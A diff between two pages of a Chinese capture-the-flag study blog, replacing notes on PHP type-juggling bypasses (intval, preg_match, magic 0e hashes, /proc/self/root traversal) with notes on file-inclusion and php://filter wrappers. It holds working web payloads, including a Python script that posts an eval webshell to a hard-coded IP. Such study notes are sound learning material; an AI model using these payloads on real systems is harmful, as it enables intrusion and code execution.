@@ -4,11 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="PHP特性, Qiu-lan&#39;s blog">
-    <meta name="description" content="弱类型自动 &amp;#x2F; 强制 类型转换语言特性：PHP 是一个弱类型语言, 变量之间进行比较时, 若两个变量类型不一致, 会先进行强制类型转换，然后再进行比较。
-规则如下：
-
-非数字开头的字符串转换成 int 类型时会变成 0, 数字开头">
+    <meta name="keywords" content="php伪协议, Qiu-lan&#39;s blog">
+    <meta name="description" content="php伪协议文件包含漏洞产生原因是在通过 PHP 的函数引入文件时，为了灵活包含文件会将被包含文件设置为变量，通过动态变量来引入需要包含的文件。此时用户可以对变量的值可控，而服务器端未对变量值进行合理地校验或者校验被绕过，就会导致文件包含漏">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>PHP特性 | Qiu-lan&#39;s blog</title>
+    <title>php伪协议 | Qiu-lan&#39;s blog</title>
     <link rel="icon" type="image/jpeg" href="/qiu%20logo.jpg">
     
 
@@ -335,12 +332,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">PHP特性</h1>
+                    <h1 class="description center-align post-title">php伪协议</h1>
                 </div>
             </div>
         </div>
@@ -376,7 +373,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2025-04-20
+                    2025-03-25
                 </div>
                 
 
@@ -397,313 +394,46 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h2><h4 id="自动-强制-类型转换"><a href="#自动-强制-类型转换" class="headerlink" title="自动 &#x2F; 强制 类型转换"></a>自动 &#x2F; 强制 类型转换</h4><p><strong>语言特性</strong>：PHP 是一个弱类型语言, 变量之间进行比较时, 若两个变量类型不一致, 会先进行强制类型转换，然后再进行比较。</p>
-<p>规则如下：</p>
-<ul>
-<li>非数字开头的字符串转换成 int 类型时会变成 0, 数字开头的字符串转换 int 类型后会保留开头的数字</li>
-<li>一个十进制数与十六进制 &#x2F; 八进制数比较时, PHP 会将十六进制 &#x2F; 八进制数转换为十进制数</li>
-<li>string 类型的转换会从最左边开始, 直到遇到非数字的字符时停止</li>
-<li>含 e 的字符串转换成 int 类型时会被当做科学计数法处理, <code>123e456</code> 表示 123 的 456 次方</li>
-<li><code>0e123</code> 表示 0 的 123 次方, 总是等于 0 <code>0e456</code> 同理</li>
-<li>在数字开头加入 <code>\f \t \s \n \r</code> 等同样返回 true</li>
-</ul>
-<h4 id="强弱类型比较"><a href="#强弱类型比较" class="headerlink" title="强弱类型比较"></a>强弱类型比较</h4><p><strong>&#x3D;&#x3D;</strong> 弱类型比较, 仅要求两边变量类型转换后的值相等</p>
-<p><strong>&#x3D;&#x3D;&#x3D;</strong> 强类型比较, 不仅要求两个变量的值相等, 还要求变量的类型相同</p>
-<p>同理 <strong>!&#x3D;</strong> 是弱类型比较, 而 <strong>!&#x3D;&#x3D;</strong> 是强类型比较</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">&#x27;123&#x27; == 123 // true 
-
-&#x27;123&#x27; === 123 // false</code></pre>
-
-<p><img src="/./php%E7%89%B9%E6%80%A7.assets/image-20250414215823672.png" alt="image-20250414215823672"></p>
-<p><img src="/./php%E7%89%B9%E6%80%A7.assets/image-20250414215903794.png" alt="image-20250414215903794"></p>
-<h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><p>基于获取变量的整数值函数的绕过</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">intval(mixed $value, int $base = 10): int
-# eg:
-intval(&#x27;0337522&#x27;, 0); # 八进制
-intval(&#x27;0x1bf52&#x27;, 0); # 十六进制
-# -> 114514</code></pre>
-
-<p>当 <code>$base = 0</code> 时, 通过检测 var（$value） 的格式来决定使用的进制：</p>
-<ul>
-<li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li>
-<li>如果字符串以 “0b” (或 “0B”) 开头，使用 2 进制 (binary)；否则，</li>
-<li>如果字符串以 “0” 开始，使用 8 进制 (octal)；否则，</li>
-<li>将使用 10 进制 (decimal)。</li>
-</ul>
-<p>另：intval 可以取整 (去除小数点后的部分) 和截断 (去除数字后的字符串, 包括科学计数法)</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">intval(&#x27;114514.0&#x27;);
-intval(&#x27;114514.1&#x27;);
-intval(&#x27;114514a&#x27;);
-intval(&#x27;114514e123&#x27;);
-# -> 114514</code></pre>
-
-<p>eg:</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">if(isset($_GET[&#x27;num&#x27;]))&#123;
-    $num = $_GET[&#x27;num&#x27;];
-    if($num==="4476")&#123;
-        die("no no no!");
-    &#125;
-    if(intval($num,0)===4476)&#123;
-        echo $flag;
-    &#125;else&#123;
-        echo intval($num,0);
-    &#125;
-&#125;</code></pre>
-
-<p>解法</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">八进制表示法：
-?num=010574
-
-010574 是八进制，转换为十进制是 4476
-字符串 "010574" 不等于 "4476"
-
-十六进制表示法：
-?num=0x117c
-
-0x117c 是十六进制，转换为十进制是 4476
-字符串 "0x117c" 不等于 "4476"
-
-科学计数法：
-?num=4476e0
-
-4476e0 转换为整数是 4476
-字符串 "4476e0" 不等于 "4476"
-
-前导空格/特殊字符：
-?num=4476%20
-
-字符串 "4476 " 不等于 "4476"
-intval() 会忽略后面的空格</code></pre>
-
-<h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h2><p>正则函数缺陷 </p>
-<h4 id="单行-多行匹配"><a href="#单行-多行匹配" class="headerlink" title="单行 &#x2F; 多行匹配"></a>单行 &#x2F; 多行匹配</h4><p>(URL编码的 <code>%0A</code> 是换行符 <code>\n</code>)</p>
-<p>在正则表达式中，<code>$</code> 是一个特殊字符（锚字符），用于匹配字符串的结尾位置。</p>
-<p>在多行模式下，<code>$</code> 不仅匹配整个字符串的结尾，还匹配每行的结尾（即 <code>\n</code> 或 <code>\r</code> 之前的位置）。</p>
-<p>如果要匹配实际的 <code>$</code> 字符（而不是作为特殊字符），需要使用转义：$</p>
-<h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><pre class=" language-highlight plaintext"><code class="language-highlight plaintext"># ctfshow-web89 正则缺陷
-# 利用数组绕过正则匹配，使其返回值发生错误而为false : ?num[]=1
-if(isset($_GET[&#x27;num&#x27;]))&#123;
-    $num = $_GET[&#x27;num&#x27;];
-    if(preg_match("/[0-9]/", $num))&#123;
-        die("no no no!");
-    &#125;
-    if(intval($num))&#123;
-        echo $flag;
-    &#125;
-&#125;</code></pre>
-
-<h4 id="正则回溯（没懂）"><a href="#正则回溯（没懂）" class="headerlink" title="正则回溯（没懂）"></a>正则回溯（没懂）</h4><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限</p>
-<p>如何绕过呢，让回溯次数超过最大限制就可以使preg_match()函数返回false，从而绕过限制，中文的回溯次数在100万次就好崩溃，这个回溯保护使PHP为了防止关于正则表达式的DDOS<br>payload:<br>GET:</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">import requests
-from io import BytesIO
-
-payload =BytesIO(b&#x27;[]&#x27;+b&#x27;a&#x27;*1000000)
-res = requests.get(&#x27;[]?[]=&#x27;+str(payload))
-print(res.text)</code></pre>
-
-<p>POST:</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">import requests
-from io import BytesIO
-
-files = &#123;
-  &#x27;file&#x27;: BytesIO(b&#x27;aaa<?php eval($_POST[txt]);//&#x27; + b&#x27;a&#x27; * 1000000)
-&#125;
-
-res = requests.post(&#x27;http://51.158.75.42:8088/index.php&#x27;, files=files, allow_redirects=False)
-print(res.headers)</code></pre>
-
-
-
-<h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h2><p>strpos — 查找字符串首次出现的位置</p>
-<p><code>strpos(&#39;01234&#39;, 0)</code> 返回的结果是 0 对应的索引 0, 也就是 false</p>
-<p>如果是 <code>!strpos()</code> 这种则会返回 true</p>
-<p>代码使用了 <code>if(!strpos($str, 0))</code> 对八进制进行过滤, 可以在字符串开头加空格绕过</p>
-<p>strpos() 遇到数组返回 null</p>
-<p>strrpos() stripos() strripos() 同理</p>
-<p><img src="/./php%E7%89%B9%E6%80%A7.assets/image-20250415204317350.png" alt="image-20250415204317350"></p>
-<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h2><p>数字或数字字符串检查函数</p>
-<p>特性：</p>
-<ul>
-<li>可识别科学计数法，如：<code>0123e4567</code> 返回 true</li>
-<li>包含非 e 字母返回 false</li>
-<li>在数字 ** 开头 ** 加入空格 换行符 tab 等特殊字符可以绕过检测</li>
-<li>可以尝试利用 base64 + bin2hex 找到一些只含 e 和数字的 payload</li>
-</ul>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">is_numeric(&#x27; 36&#x27;); // true
-is_numeric(&#x27;36 &#x27;); // false
-is_numeric(&#x27;3 6&#x27;); // false
-is_numeric("\n36"); // true
-is_numeric("\t36"); // true
-is_numeric("36\n"); // false
-is_numeric("36\t"); // false</code></pre>
-
-<p><img src="/./php%E7%89%B9%E6%80%A7.assets/image-20250415210640094.png" alt="image-20250415210640094"></p>
-<h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h2><p>is_array() 可以「检测」变量是不是「数组」类型。</p>
-<p>由于 PHP 自动 &#x2F; 强制 类型转换的特性，会将待搜索的值的类型自动转换为数组中的值的类型。</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">var_dump(in_array(&#x27;1abc&#x27;, [1,2,3,4,5])); // true
-var_dump(in_array(&#x27;abc&#x27;, [1,2,3,4,5])); // false
-var_dump(in_array(&#x27;abc&#x27;, [0,1,2,3,4,5])); // true</code></pre>
-
-<p>注意： is_array() 函数只能判断「普通数组」，不能判断关联数组或多维数组。</p>
-<p>is_array() 只关心变量的「类型」，而不关心里面的「值」；即使里面没有值，也会返回true。</p>
-<p>is_array() 一次只能判断「一个」变量，如果传入多个变量，会报Warning，并且执行结果也不正确。</p>
-<h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h2><p>ereg()限制password的格式，只能是数字或者字母。但ereg()函数存在NULL截断漏洞，可以使用%00绕过验证。</p>
-<p>.**ereg()**函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</p>
-<p>这里ereg有两个漏洞： </p>
-<p>  ①%00截断及遇到%00则默认为字符串的结束</p>
-<p>  ②当ntf为数组时它的返回值不是FALSE</p>
-<h2 id="trim-¶"><a href="#trim-¶" class="headerlink" title="trim()¶"></a>trim()<a target="_blank" rel="noopener" href="https://hello-ctf.com/hc-tags/web/PHP_features/#trim">¶</a></h2><p>不过滤 \f 换页符, url 编码后是 <code>%0c36</code></p>
-<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>几种形式</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$$key = $$value;
-
-extract()
-parse_str()
-import_request_variables()</code></pre>
-
-<p>思路是 <code>$_GET</code> <code>$_POST</code> <code>$_COOKIKE</code> 相互转换</p>
-<p>或者利用 <code>$GLOBALS</code> 输出所有的全局变量</p>
-<p>另外</p>
-<p><strong>parse_str()</strong> 函数把查询字符串解析到变量中。</p>
-<p>注释：<strong>如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</strong></p>
-<p> 即parse_str() 接受数组传参 支持数组内变量覆盖</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?_POST[key1]=36d&_POST[key2]=36d</code></pre>
-
-<p> <strong>import_request_variables()</strong></p>
-<p>将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.core.php#ini.register-globals">register_globals</a>，但又想用到一些全局变量，那么此函数就很有用。</p>
-<h2 id="路径穿越"><a href="#路径穿越" class="headerlink" title="路径穿越"></a>路径穿越</h2><p>通过绝对路径 &#x2F; 相对路径绕过正则对文件名的检测, 例如 <code>preg_match(&#39;/flag.php/&#39;, $str)</code></p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">./flag.php
-./ctfshow/../flag.php
-/var/www/html/flag.php</code></pre>
-
-<p>利用 Linux 下的软链接绕过</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
-roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
-c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
-self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
-lf/root/proc/self/root/var/www/html/flag.php</code></pre>
-
-
-
-<p>php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经<code>require_once(&#39;flag.php&#39;)</code>，已经include的文件不可以再require_once。</p>
-<p>在这里有个小知识点，<code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，payload:</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
-
-//result PD9waHAKCiRmbGFnPSJ0ZXN0e30iOwo=</code></pre>
-
-
-
-<h2 id="哈希字符串"><a href="#哈希字符串" class="headerlink" title="哈希字符串"></a>哈希字符串</h2><h3 id="0e-bypass"><a href="#0e-bypass" class="headerlink" title="0e bypass"></a>0e bypass</h3><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$_GET[&#x27;name&#x27;] != $_GET[&#x27;password&#x27;]
-MD5($_GET[&#x27;name&#x27;]) == MD5($_GET[&#x27;password&#x27;])</code></pre>
-
-<p>PHP 在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为 0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么 PHP 将会认为他们相同，都是 0。</p>
-<p>这一点在 md5() &#x2F; sha1() 都适用，以下是可用的 payload：</p>
-<h4 id="md5-0e-payload"><a href="#md5-0e-payload" class="headerlink" title="md5 0e payload"></a>md5 0e payload</h4><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">QNKCDZO
-240610708 
-s878926199a 
-s155964671a 
-s214587387a</code></pre>
-
-
-
-<h4 id="sha1-0e-payload"><a href="#sha1-0e-payload" class="headerlink" title="sha1 0e payload"></a>sha1 0e payload</h4><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">```sha1 0e payload
-# sha1 0e payload
-aaroZmOk
-aaK1STfY
-aaO8zKZF
-aa3OFF9m
-0e1290633704
-10932435112</code></pre>
-
-
-
-<h3 id="Array-bypass"><a href="#Array-bypass" class="headerlink" title="Array bypass"></a>Array bypass</h3><p>md5 加密数组时返回 null</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$a = Array();
-$b = Array();
-
-md5($a) == md5($b); // null == null true
-md5($a) === md5($b); // null === null true</code></pre>
-
-<p>sha1 同理</p>
-<h4 id="哈希碰撞"><a href="#哈希碰撞" class="headerlink" title="哈希碰撞"></a>哈希碰撞</h4><p>eg:</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext"># ctfshow - web97
-if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;
-    if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])
-        if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))
-            echo $flag;
-    else
-        print &#x27;Wrong.&#x27;;
-&#125;
-# a[]=1&b[]=2 -> 弱类型比较可以直接数组绕过，其结果都会转换为null</code></pre>
-
-<p>如果进行了 string 强制转类型后，则不再接受数组，以下为弱碰撞：</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$a=(string)$a;
-$b=(string)$b;
-if(  ($a!==$b) && (md5($a)==md5($b)) )&#123;
-    echo $flag;
-&#125;
-# a=QNKCDZO&b=240610708</code></pre>
-
-<p>强碰撞则不为特性，这时需要找到两个真正的 md5 值相同数据：</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$a=(string)$a;
-$b=(string)$b;
-if(  ($a!==$b) && (md5($a)===md5($b)) )&#123;
-    echo $flag;
-&#125;
-# 使用使用 fastcoll / hashclash 工具进行md5碰撞生成相同md5但不通变量值的内容</code></pre>
-
-
-
-<h2 id="扩"><a href="#扩" class="headerlink" title="扩"></a>扩</h2><h3 id="函数与数字运算"><a href="#函数与数字运算" class="headerlink" title="函数与数字运算"></a>函数与数字运算</h3><p>在 PHP 中, 函数与数字进行运算的时候, 函数能够被正常执行</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">1+phpinfo()+1;</code></pre>
-
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">+ - * / & |` 都行, 另外还有 `&& ||</code></pre>
-
-
-
-<h3 id="三目运算符构造语句"><a href="#三目运算符构造语句" class="headerlink" title="三目运算符构造语句"></a>三目运算符构造语句</h3><p>有时候构造不带分号 payload 时需要用到三目运算符</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">return 1 ? phpinfo():1;
-(<条件> ? 参数_1 : 参数_2)</code></pre>
-
-<p>1 永远为 true, 于是正常执行 phpinfo</p>
-<h3 id="根命名空间-绕过过滤"><a href="#根命名空间-绕过过滤" class="headerlink" title="根命名空间 绕过过滤"></a>根命名空间 绕过过滤</h3><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">PHP 的命名空间默认为 \, 所有的函数和类都在 \ 这个命名空间中, 如果直接写函数名 function_name() 调用, 调用的时候其实相当于写了一个相对路径; 而如果写 \function_name() 这样调用函数. 则其实是写了一个绝对路径. 如果你在其他 namespace 里调用系统类, 就必须写绝对路径这种写法.</code></pre>
-
-<p>有时候可以绕过一些正则, 比如执行的代码不允许以字母开头</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">\phpinfo();</code></pre>
-
-
-
-<h3 id="gettext"><a href="#gettext" class="headerlink" title="gettext()"></a>gettext()</h3><p>不含字母数字的函数:<code>_()</code> 为 gettext() 别名, 类似于 echo 输出。</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">var_dump(call_user_func(call_user_func("_", "get_defined_vars")));</code></pre>
-
-<p>以上命令可以返回所有已定义变量</p>
-<h3 id="GLOBALS-和-get-defined-vars"><a href="#GLOBALS-和-get-defined-vars" class="headerlink" title="$GLOBALS 和 get_defined_vars()"></a>$GLOBALS 和 get_defined_vars()</h3><p><code>$GLOBALS</code> 引用全局作用域中可用的全部变量</p>
-<p>get_defined_vars() 返回由所有已定义变量所组成的数组</p>
-<p>有时候可以从这里面查看 <code>$flag</code></p>
-<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>常见的 php:&#x2F;&#x2F;filter php:&#x2F;&#x2F;input data:&#x2F;&#x2F; 都很熟悉了</p>
-<p>下面是一些不是很常见的 payload</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">compress.zlib://flag.php
-php://filter/ctfshow/resource=flag.php</code></pre>
-
-<p>php:&#x2F;&#x2F;filter 遇到不存在的过滤器会直接跳过, 可以绕过一些对关键字的检测</p>
-<h3 id="无参数函数读文件-RCE"><a href="#无参数函数读文件-RCE" class="headerlink" title="无参数函数读文件 &#x2F;RCE"></a>无参数函数读文件 &#x2F;RCE</h3><p>无参数函数指形如 <code>a(b(c()))</code> 这种不需要参数或者只需要一个参数, 并且对应的参数可以通过另一个函数的返回值来获取的函数</p>
-<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">create_function(string $args, string $code): string</code></pre>
-
-<p>create_function(string $args, string $code): string</p>
-<h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">call_user_func(callable $callback, mixed ...$args): mixed</code></pre>
-
-
-
-<h3 id="原生类列目录-RCE"><a href="#原生类列目录-RCE" class="headerlink" title="原生类列目录 &#x2F;RCE"></a>原生类列目录 &#x2F;RCE</h3><p>一般都是 <code>echo new $v1($v2(&#39;xxx&#39;))</code> 或者 <code>eval($v(&#39;ctfshow&#39;))</code> 的形式, 有时候可以跳出来执行其它代码</p>
-<p>ReflectionClass 和 Exception 里面可以执行其它函数</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">new Exception(system(&#x27;xx&#x27;))
-new ReflectionClass(system(&#x27;xx&#x27;))
-new FilesystemIterator(getcwd())
-new ReflectionClass(&#x27;stdClass&#x27;);system()//</code></pre>
-
-<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="属性类型不敏感"><a href="#属性类型不敏感" class="headerlink" title="属性类型不敏感"></a>属性类型不敏感</h3><p>在 PHP 7.1 + 的版本中, 对属性类型 (public protected private) 不敏感。</p>
-<p>因为 protected 和 private 反序列化后的结果中含有 <code>%00</code>, 部分题目会禁止这种字符, 可在构造 payload 时将属性全部改成 public 来绕过限制。</p>
-<h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h3><p>该机制中的缓存可被文件包含和反序列化恶意利用。</p>
-
+                <h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>产生原因是在通过 PHP 的函数引入文件时，为了灵活包含文件会将被包含文件设置为变量，通过动态变量来引入需要包含的文件。此时用户可以对变量的值可控，而服务器端未对变量值进行合理地校验或者校验<strong>被绕过</strong>，就会导致文件包含漏洞。</p>
+<h2 id="包含漏洞分类"><a href="#包含漏洞分类" class="headerlink" title="包含漏洞分类"></a>包含漏洞分类</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>当包含的文件在服务器本地时，就形成了本地文件包含。文件包含可以包含任意文件，被包含的文件可以不是 PHP 代码，可以是文本或图片等。只要文件被包含就会被服务器脚本语言执行，如果包含的文件内容<strong>不符合</strong> php 语法，会直接将文件内容输出。</p>
+<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>当包含的文件在远程服务器上时，就形成了远程文件包含。所包含远程服务器的文件后缀<strong>不能</strong>与目标服务器语言相同，远程文件包含需要在 php.ini 中设置：</p>
+<pre class=" language-highlight ini">Copy <span class="attr">Highlighter-hljsallow_url_include</span> = <span class="literal"><code class="language-highlight ini">Copy <span class="attr">Highlighter-hljsallow_url_include</span> = <span class="literal">on</span>（是否允许 include/require 远程文件）
+<span class="attr">allow_url_fopen</span> = <span class="literal">on</span>（是否允许打开远程文件）</code></pre>
+
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><h2 id="PHP-伪协议"><a href="#PHP-伪协议" class="headerlink" title="PHP 伪协议"></a>PHP 伪协议</h2><p><strong>PHP 伪协议</strong>是 PHP 支持的协议与封装协议，几个 PHP 支持的伪协议如下。</p>
+<table>
+<thead>
+<tr>
+<th>伪协议</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file:&#x2F;&#x2F;</td>
+<td>访问本地文件系统</td>
+</tr>
+<tr>
+<td>http:&#x2F;&#x2F;</td>
+<td>访问 HTTP(s) 网址</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;</td>
+<td>访问各个输入&#x2F;输出流</td>
+</tr>
+<tr>
+<td>phar:&#x2F;&#x2F;</td>
+<td>PHP 归档</td>
+</tr>
+<tr>
+<td>zip:&#x2F;&#x2F;</td>
+<td>压缩流</td>
+</tr>
+</tbody></table>
+<pre class=" language-highlight bash"><code class="language-highlight bash">?file=php://filter/read=convert.base64-encode/resource=index.php</code></pre>
+
+<p>稍微解释下这个做法，<strong>php:&#x2F;&#x2F;filter&#x2F;</strong> 是一种访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode&#x2F; 表示读取的方式是 base64 编码后，convert.base64-encode是一种过滤器，resource&#x3D;index.php 表示目标文件为index.php。问什么要进行 base64 编码呢？如果不进行 base64 编码传入，index.php 就会直接执行，我们就看不到文件中的内容了。<br>php 协议还常用 <strong>php:&#x2F;&#x2F;input</strong>，这可以访问请求的原始数据的只读流，可以读取 POST 请求的参数。</p>
+<h2 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data 伪协议"></a>data 伪协议</h2><p>php 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。使用方法为:</p>
+<pre class=" language-highlight scss">Copy Highlighter-hljsdata://text/plain;base64,<span class="built_in"><code class="language-highlight scss">Copy Highlighter-hljsdata://text/plain;base64,<span class="built_in">xxxx</span>(base64编码后的数据)</code></pre>
                 
             </div>
             <hr/>
@@ -729,7 +459,7 @@ new ReflectionClass(&#x27;stdClass&#x27;);system()//</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Qiu-lan.github.io/2025/04/20/php%E7%89%B9%E6%80%A7/">https://Qiu-lan.github.io/2025/04/20/php%E7%89%B9%E6%80%A7/</a>
+                    <a href="https://Qiu-lan.github.io/2025/03/25/php-wei-xie-yi/">https://Qiu-lan.github.io/2025/03/25/php-wei-xie-yi/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -809,7 +539,7 @@ new ReflectionClass(&#x27;stdClass&#x27;);system()//</code></pre>
         repo: '',
         owner: '',
         admin: null,
-        id: '2025-04-20T20-15-18',
+        id: '2025-03-25T20-11-58',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -837,50 +567,11 @@ new ReflectionClass(&#x27;stdClass&#x27;);system()//</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;Current
-            </div>
-            <div class="card">
-                <a href="/2025/04/20/php%E7%89%B9%E6%80%A7/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="PHP特性">
-                        
-                        <span class="card-title">PHP特性</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-04-20
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            Qiu
-                            
-                        </span>
-                    </div>
-                </div>
-
-                
-            </div>
-        </div>
-        
-        
         <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2025/03/28/%E5%B8%B8%E8%A7%81%E8%84%9A%E6%9C%AC/">
+                <a href="/2025/03/28/chang-jian-jiao-ben/">
                     <div class="card-image">
                         
                         
@@ -896,8 +587,45 @@ new ReflectionClass(&#x27;stdClass&#x27;);system()//</code></pre>
                         
                     </div>
                     <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-03-28
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Qiu
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/01/29/sql/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="SQL注入">
+                        
+                        <span class="card-title">SQL注入</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-03-28
